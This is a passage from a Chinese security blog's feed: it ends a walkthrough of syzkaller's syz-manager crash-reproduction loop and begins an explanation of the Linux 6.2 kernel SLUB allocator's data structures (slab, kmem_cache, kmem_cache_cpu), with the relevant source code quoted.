crepro=%v desc=&#x27;%v&#x27;&quot;</span>,<br>res.instances, res.report0.Title, res.repro != <span class="hljs-literal">nil</span>, crepro, title)<br><span class="hljs-keyword">if</span> res.err != <span class="hljs-literal">nil</span> &#123;<br>log.Logf(<span class="hljs-number">0</span>, <span class="hljs-string">&quot;repro failed: %v&quot;</span>, res.err)<br>&#125;<br><span class="hljs-built_in">delete</span>(reproducing, res.report0.Title)<br><span class="hljs-keyword">if</span> res.repro == <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> !res.hub &#123;<br>mgr.saveFailedRepro(res.report0, res.stats)<br>&#125;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>mgr.saveRepro(res)<br>&#125;<br></code></pre></td></tr></table></figure><p><code>shutdown</code> 中有数据则表示收到了终止信号，此时会将 <code>shutdown</code> 置为 nil，终止循环：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> &lt;-shutdown:<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: shutting down...&quot;</span>)<br>shutdown = <span class="hljs-literal">nil</span><br></code></pre></td></tr></table></figure><p><code>hubReproQueue</code> 上也可能传来 crash，此处将其送入 <code>pendingRepro</code> 表中等待在后续循环中复现：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> crash := &lt;-mgr.hubReproQueue:<br>log.Logf(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;loop: get repro from hub&quot;</span>)<br>pendingRepro[crash] = <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure><p><code>needMoreRepros</code> 是一个传输 channel 的 channel，这里会将一个条件判断结果传入传来的 channel 中并重新跳回等待：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> reply := &lt;-mgr.needMoreRepros:<br>reply &lt;- phase &gt;= phaseTriagedHub &amp;&amp;<br><span class="hljs-built_in">len</span>(reproQueue)+<span class="hljs-built_in">len</span>(pendingRepro)+<span class="hljs-built_in">len</span>(reproducing) == <span class="hljs-number">0</span><br><span class="hljs-keyword">goto</span> wait<br></code></pre></td></tr></table></figure><p>最后是 <code>reproRequest</code>，该 channel 意为<strong>主动进行复现的请求</strong>，这里会拷贝 <code>reproducing</code> 位图后将其传入传来的 channel 中：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">case</span> reply := &lt;-mgr.reproRequest:<br>repros := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-type">bool</span>)<br><span class="hljs-keyword">for</span> title := <span class="hljs-keyword">range</span> reproducing &#123;<br>repros[title] = <span class="hljs-literal">true</span><br>&#125;<br>reply &lt;- repros<br><span class="hljs-keyword">goto</span> wait<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>至此，<code>syz-manager</code> 的基本运行逻辑分析完毕</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;宁就是👴の Manager 🐎&lt;/p&gt;</summary>
    
    
    
    <category term="FUZZ" scheme="http://blog.arttnba3.cn/categories/FUZZ/"/>
    
    
    <category term="漏洞挖掘" scheme="http://blog.arttnba3.cn/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
    
    <category term="FUZZ" scheme="http://blog.arttnba3.cn/tags/FUZZ/"/>
    
    <category term="syzkaller" scheme="http://blog.arttnba3.cn/tags/syzkaller/"/>
    
  </entry>
  
  <entry>
    <title>【OS.0x04】Linux Kernel 内存管理浅析 III - Slub Allocator</title>
    <link href="http://blog.arttnba3.cn/2023/02/24/OS-0X04-LINUX-KERNEL-MEMORY-6.2-PART-III/"/>
    <id>http://blog.arttnba3.cn/2023/02/24/OS-0X04-LINUX-KERNEL-MEMORY-6.2-PART-III/</id>
    <published>2023-02-23T18:24:42.000Z</published>
    <updated>2023-04-23T17:58:23.750Z</updated>
    
    <content type="html"><![CDATA[<p>别人问你哪里丑态你再把他反手挂到自己的小 slub 里寻求认同</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00.一切开始之前"></a>0x00.一切开始之前</h1><blockquote><p>因为这系列文章🕊🕊🕊太久了，内核的内存管理也发生了一定的变化，所以本文直接用最新的 6.2 版本的内核源码：）</p></blockquote><p>在<a href="https://arttnba3.cn/2022/06/30/OS-0X03-LINUX-KERNEL-MEMORY-5.11-PART-II/">上一篇文章</a> 中笔者简要介绍了 buddy system 的基本流程，但其为一个「页」这一级的 allocator，在日常生活中使用（？）难免有些浪费，因为内核中需要动态内存分配的场景虽然很多，但是我们<strong>通常并不需要使用一整页起步的内存，而往往是需要分配一些比较小的对象</strong>——因此 slab allocator 应运而生，其代替我们向 buddy system 请求内存页，并分割为多个小的 object，当我们每次需要时只需要取一个 object 即可</p><blockquote><p>slab 又被称为内核的堆（heap）内存管理，因为其与用户态的内存“堆”（heap）类似，都是动态分配的内存</p></blockquote><p>slab allocator 一共有三种版本：</p><ul><li>slab（最初的版本，机制比较复杂，效率不高）</li><li>slob（用于嵌入式等场景的极为简化版本）</li><li><strong>slub</strong>（优化后的版本，<strong>现在的通用版本</strong>）</li></ul><blockquote><p>这三种内存分配器的顶层 API 是一致的，但内部实现是不一致的（例如 slab 和 slub 各自有一个对 <code>kmem_cache</code> 的不同定义）</p></blockquote><p>本篇文章中我们主要介绍的是 <strong>slub</strong> ，也是现在内核中最为通用的小对象分配器</p><h1 id="0x01-slub-allocator-的基本结构"><a href="#0x01-slub-allocator-的基本结构" class="headerlink" title="0x01. slub allocator 的基本结构"></a>0x01. slub allocator 的基本结构</h1><p>首先来一张 Overview：</p><p><img src="https://i.loli.net/2021/07/22/ivPnbsjHyI94m5z.png" alt="image.png"></p><h2 id="一、slab：单份-object-池"><a href="#一、slab：单份-object-池" class="headerlink" title="一、slab：单份 object 池"></a>一、slab：单份 object 池</h2><p>Linux kernel 中用以统筹所有内存的依然是 buddy system，slub allocator 也不例外，其负责向 buddy system 请求内存后分割给多个小 object 后再返还给上层调用者，<strong>单次向 buddy system 所请求的一份连续内存页便称之为一张 slab</strong>，在内核中对应 <code>slab</code> 结构体，<strong>本质上是复用 page 结构体</strong>：</p><blockquote><p>这里我们仅关注 slub，所以笔者仅截取 slub 所需字段</p><blockquote><p>老版本中 slab 是直接内嵌在 page 结构体中的</p></blockquote></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* Reuses the bits in struct page */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> __page_flags;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">elif</span> defined(CONFIG_SLUB)</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *<span class="hljs-title">slab_cache</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">slab_list</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">next</span>;</span><br><span class="hljs-type">int</span> slabs;<span class="hljs-comment">/* 剩余的 slabs 数量 */</span><br>&#125;;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br><span class="hljs-comment">/* Double-word boundary */</span><br><span class="hljs-type">void</span> *freelist;<span class="hljs-comment">/* 第一个空闲对象 */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> counters;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-type">unsigned</span> inuse:<span class="hljs-number">16</span>;<br><span class="hljs-type">unsigned</span> objects:<span class="hljs-number">15</span>;<br><span class="hljs-type">unsigned</span> frozen:<span class="hljs-number">1</span>;<br>&#125;;<br>&#125;;<br>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">rcu_head</span> <span class="hljs-title">rcu_head</span>;</span><br>&#125;;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> __unused;<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">atomic_t</span> __page_refcount;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MEMCG</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> memcg_data;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><code>slab_cache</code> ：该 slab 对应的内存池</li><li><code>freelist</code> ：<strong>Slab 上的空闲对象组织为一个 NULL 结尾的单向链表</strong>，该指针指向第一个空闲对象，耗尽时为 NULL</li><li><code>slab_list</code> ：按用途连接多个 slabs 的双向链表</li><li><code>inuse</code> ：已被使用的对象数量</li><li><code>objects</code>：该 slab 上的对象总数</li><li><code>frozen</code>：是否被冻结，即<strong>已经归属于特定的 CPU</strong></li></ul><blockquote><p>这里我们需要注意的是 <strong>counters 成员直接涵盖了 inuse &amp; objects &amp; frozen</strong>，后面会有大量的直接通过 counters 成员进行赋值的操作，<strong>实际上就是赋值了 inuse &amp; objects &amp; frozen</strong></p></blockquote><p>正如一个 page 结构体直接对应一张内存页（或复合页），复用了 page 结构体的 slab 也<strong>直接对应一份 slab 内存页</strong>，借助 <code>page_to_pfn()</code> 等函数可以直接完成 slab 结构体到对应内存页虚拟地址的转换，反之亦然，即<strong>我们可以直接通过一个空闲对象的虚拟地址找到对应的 slab 结构体</strong></p><p><img src="https://s2.loli.net/2023/02/21/cBXCGF4Z18VLMzl.png" alt="image.png"></p><h2 id="二、kmem-cache：特定大小-amp-用途对象（堆块）的内存池"><a href="#二、kmem-cache：特定大小-amp-用途对象（堆块）的内存池" class="headerlink" title="二、kmem_cache：特定大小&amp;用途对象（堆块）的内存池"></a>二、kmem_cache：特定大小&amp;用途对象（堆块）的内存池</h2><p><code>kmem_cache</code> 为一个基本的 allocator 组件，可以理解为 <strong>用于分配某个特定大小（某种特定用途）的对象的内存池</strong>，所有的 kmem_cache 构成一个双向链表，并存在一个对应的通用 <code>kmem_cache</code> 数组 <code>kmalloc_caches</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> *</span><br><span class="hljs-class"><span class="hljs-title">kmalloc_caches</span>[<span class="hljs-title">NR_KMALLOC_TYPES</span>][<span class="hljs-title">KMALLOC_SHIFT_HIGH</span> + 1] __<span class="hljs-title">ro_after_init</span> =</span><br>&#123; <span class="hljs-comment">/* initialization for https://bugs.llvm.org/show_bug.cgi?id=42570 */</span> &#125;;<br>EXPORT_SYMBOL(kmalloc_caches);<br></code></pre></td></tr></table></figure><blockquote><p>老版本还有个 dma 专用数组 <code>kmalloc_dma_caches</code> ，在 <a href="https://patchwork.kernel.org/project/linux-mm/patch/20180718133620.6205-2-vbabka@suse.cz/">这个 commit</a> 给合并起来了</p></blockquote><h3 id="I-基本结构"><a href="#I-基本结构" class="headerlink" title="I. 基本结构"></a>I. 基本结构</h3><p>该结构体定义于 <code>include/linux/slub_def.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Slab 缓存管理.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache</span> &#123;</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_SLUB_TINY</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_cpu</span> __<span class="hljs-title">percpu</span> *<span class="hljs-title">cpu_slab</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-comment">/* 用于取回 partial slabs 等. */</span><br><span class="hljs-type">slab_flags_t</span> flags;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> min_partial;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> size;<span class="hljs-comment">/* 一个对象包含元数据的大小 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> object_size;<span class="hljs-comment">/* 一个对象不包含元数据的大小 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">reciprocal_value</span> <span class="hljs-title">reciprocal_size</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> offset;<span class="hljs-comment">/* 空闲指针的偏移 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span><br><span class="hljs-comment">/* 要保留的 per cpu partial 对象数量 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cpu_partial;<br><span class="hljs-comment">/* 要保留的 per cpu partial slub 数量 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cpu_partial_slabs;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_order_objects</span> <span class="hljs-title">oo</span>;</span><br><br><span class="hljs-comment">/* 分配与释放 slabs */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_order_objects</span> <span class="hljs-title">min</span>;</span><br><span class="hljs-type">gfp_t</span> allocflags;<span class="hljs-comment">/* （译注：向 buddy system）分配时所用的 gfp 标志位 */</span><br><span class="hljs-type">int</span> refcount;<span class="hljs-comment">/* 用于 slab 缓存销毁的引用计数 */</span><br><span class="hljs-type">void</span> (*ctor)(<span class="hljs-type">void</span> *);<br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> inuse;<span class="hljs-comment">/* 元数据的偏移 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> align;<span class="hljs-comment">/* 对齐 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> red_left_pad;<span class="hljs-comment">/* Left redzone padding size */</span><br><span class="hljs-type">const</span> <span class="hljs-type">char</span> *name;<span class="hljs-comment">/* Name (only for display!) */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">list_head</span> <span class="hljs-title">list</span>;</span><span class="hljs-comment">/* slab 缓存链表 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SYSFS</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kobject</span> <span class="hljs-title">kobj</span>;</span><span class="hljs-comment">/* For sysfs */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB_FREELIST_HARDENED</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> random;<span class="hljs-comment">// 用于加密 freelist 指针的随机值</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_NUMA</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * 通过从一个 remote node 分配以去碎片化.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> remote_node_defrag_ratio;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLAB_FREELIST_RANDOM</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> *random_seq;<span class="hljs-comment">// 用于在初始化时随机化 freelist</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_KASAN</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kasan_cache</span> <span class="hljs-title">kasan_info</span>;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_HARDENED_USERCOPY</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> useroffset;<span class="hljs-comment">/* 用户拷贝区域的偏移 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> usersize;<span class="hljs-comment">/* 用户拷贝区域的大小 */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_node</span> *<span class="hljs-title">node</span>[<span class="hljs-title">MAX_NUMNODES</span>];</span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><p><code>cpu_slab</code>： <em>percpu 变量</em> ，指向一个 <code>kmem_cache_cpu</code> 结构体，即<strong>当前 CPU 独占的内存池</strong></p></li><li><p><code>flags</code>：标志位</p></li><li><p><code>min_partial</code>：node partial 链表上 slab 的<strong>最大数量</strong>（👴也不知道为什么要叫min，但实际判定发挥的是max的作用）</p></li><li><p><code>size</code>：一个对象的实际大小</p></li><li><p><code>object_size</code>：一个对象所用数据的大小</p><blockquote><p>例如 <code>struct cred</code> 大小为 176（object_size），实际分配的对象大小为 192 （size）</p></blockquote></li><li><p><code>offset</code>：slab 上空闲对象链表指针在对象上的偏移</p></li><li><p><code>oo</code> ： <em>其实就是一个 int</em> </p><ul><li>低 16 位：一张 slab 上的对象数量</li><li>高 16 位：一张 slab 的大小（2<sup>n</sup> 张内存页）</li></ul></li><li><p><code>min</code>：一张 slab 上最少的对象数量</p></li><li><p><code>allocflags</code>：向 buddy system 请求页面时所用的 gfp flag</p></li><li><p><code>ctor</code>：对象的构造函数，在分配对象后会调用该函数进行初始化</p></li><li><p><code>inuse</code>：实际上就是 <code>object_size</code></p></li><li><p><code>align</code>：对象对齐的宽度</p></li><li><p>Randomed freelist 保护相关：</p><ul><li><code>random_seq</code> ：用于在 slab 初始化时随机化 freelist 上空闲对象的连接顺序</li></ul></li><li><p>Hardened Usercopy 保护相关</p><ul><li><code>useroffset</code>：用户空间能读写区域的起始偏移</li><li><code>usersize</code>：用户空间能读写区域的大小</li></ul></li><li><p><code>node</code>：一个 <code>kmem_cache_node</code> 数组，对应多个<strong>不同 node 的后备内存池</strong></p></li></ul><p><img src="https://s2.loli.net/2023/02/21/D4idvgzLAaqIBQM.png" alt="image.png"></p><h3 id="II-类型"><a href="#II-类型" class="headerlink" title="II. 类型"></a>II. 类型</h3><p>初始时一共有如下几种类型的 <code>kmem_cache</code>，在进行内存分配时若未指定内存池则会根据对应的 flag 从不同的 <code>kmem_cache</code> 中取：</p><ul><li><code>KMALLOC_NORMAL</code> ：通用类型内存池，对应 <code>kmalloc-*</code>，对应分配 flag 为 <code>GFP_KERNEL</code></li><li><code>KMALLOC_DMA</code>：用于 DMA 的内存池，对应 <code>kmalloc-dma-*</code></li><li><code>KMALLOC_RECLAIM</code> 可以被回收的内存池，对应 <code>kmalloc-rcl-*</code></li><li><code>KMALLOC_CGROUP</code> ：用于需要进行数量统计（<code>accounted</code>，主要用于 CGROUP 相关）的内存池，对应 <code>kmalloc-cg-*</code> ，对应分配 flag 为 <code>GFP_KERNEL_ACCOUNT</code></li></ul><p>若是未开启对应的编译选项，则默认合并入 <code>KMALLOC_NORMAL</code> </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * Whenever changing this, take care of that kmalloc_type() and</span><br><span class="hljs-comment"> * create_kmalloc_caches() still work as intended.</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * KMALLOC_NORMAL can contain only unaccounted objects whereas KMALLOC_CGROUP</span><br><span class="hljs-comment"> * is for accounted but unreclaimable and non-dma objects. All the other</span><br><span class="hljs-comment"> * kmem caches can have both accounted and unaccounted objects.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">kmalloc_cache_type</span> &#123;</span><br>KMALLOC_NORMAL = <span class="hljs-number">0</span>,<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_ZONE_DMA</span><br>KMALLOC_DMA = KMALLOC_NORMAL,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> CONFIG_MEMCG_KMEM</span><br>KMALLOC_CGROUP = KMALLOC_NORMAL,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_TINY</span><br>KMALLOC_RECLAIM = KMALLOC_NORMAL,<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>KMALLOC_RECLAIM,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_ZONE_DMA</span><br>KMALLOC_DMA,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_MEMCG_KMEM</span><br>KMALLOC_CGROUP,<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>NR_KMALLOC_TYPES<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="III-slab-alias（mergeability）"><a href="#III-slab-alias（mergeability）" class="headerlink" title="III. slab alias（mergeability）"></a>III. slab alias（mergeability）</h3><p>slab alias 机制是一种对同等&#x2F;相近大小 object 的 <code>kmem_cache</code> 进行<strong>复用</strong>的一种机制：</p><ul><li>当一个 <code>kmem_cache</code> 在创建时，若已经存在能分配相等&#x2F;近似大小的 object 的 <code>kmem_cache</code> ，则<strong>不会创建新的 kmem_cache，而是为原有的 kmem_cache 起一个 alias，作为“新的” kmem_cache 返回</strong></li></ul><blockquote><p>举个🌰，<code>cred_jar</code> 是专门用以分配 <code>cred</code> 结构体的 <code>kmem_cache</code>，在 Linux 4.4 之前的版本中，其为 <code>kmalloc-192</code> 的 alias，即 cred 结构体与其他的 192 大小的 object 都会从同一个 <code>kmem_cache</code>——<code>kmalloc-192</code> 中分配</p></blockquote><p>对于初始化时设置了 <code>SLAB_ACCOUNT</code> 这一 flag 的 <code>kmem_cache</code> 而言，则会新建一个新的 <code>kmem_cache</code> 而非为原有的建立 alias，🌰如在新版的内核当中 <code>cred_jar</code> 与 <code>kmalloc-192</code> 便是两个独立的 <code>kmem_cache</code>，<strong>彼此之间互不干扰</strong></p><h2 id="三、kmem-cache-cpu：各-CPU-独占内存池"><a href="#三、kmem-cache-cpu：各-CPU-独占内存池" class="headerlink" title="三、kmem_cache_cpu：各 CPU 独占内存池"></a>三、kmem_cache_cpu：各 CPU 独占内存池</h2><p>当进程向 slab allocator 请求内存分配时，首先会尝试从当前 CPU 的独占内存池进行分配 ——<code>kmem_cache_cpu</code> 结构体表示<strong>每个 CPU 独占的内存池</strong>，其在 <code>kmem_cache</code> 中为一个 percpu 变量：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * When changing the layout, make sure freelist and tid are still compatible</span><br><span class="hljs-comment"> * with this_cpu_cmpxchg_double() alignment requirements.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">kmem_cache_cpu</span> &#123;</span><br><span class="hljs-type">void</span> **freelist;<span class="hljs-comment">/* 指向下一个可用对象的指针 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> tid;<span class="hljs-comment">/* Globally unique transaction id */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">slab</span>;</span><span class="hljs-comment">/* 用以内存分配的 slab */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_CPU_PARTIAL</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">slab</span> *<span class="hljs-title">partial</span>;</span><span class="hljs-comment">/* Partially allocated frozen slabs */</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-type">local_lock_t</span> lock;<span class="hljs-comment">/* Protects the fields above */</span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> CONFIG_SLUB_STATS</span><br><span class="hljs-type">unsigned</span> stat[NR_SLUB_STAT_ITEMS];<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;;<br></code></pre></td></tr></table></figure><ul><li><code>freelist</code>：指向下一个空闲对象的指针</li><li><code>slab</code>：当前用以进行内存分配的 slab</li><li><code>partial</code>：percpu partial slab 链表，链表上为仍有一定空闲对象的 slab</li></ul><p>slab 的 freelist 仅当其在 partial 链表上时有用，当一张 slab 为当前 CPU 正在使用的 slab 时，其 freelist 为 NULL，由 <code>kmem_cache_cpu.freelist</code> 指向第一个空闲对象</p><p><img src="https://s2.loli.net/2023/02/21/xSLqghNZ23nCMiz.png" alt="image.png"></p><h2 id="四、kmem-cache-node：各-node-后备内存池"><a href="#四、kmem-cache-node：各-node-后备内存池" class="headerlink" 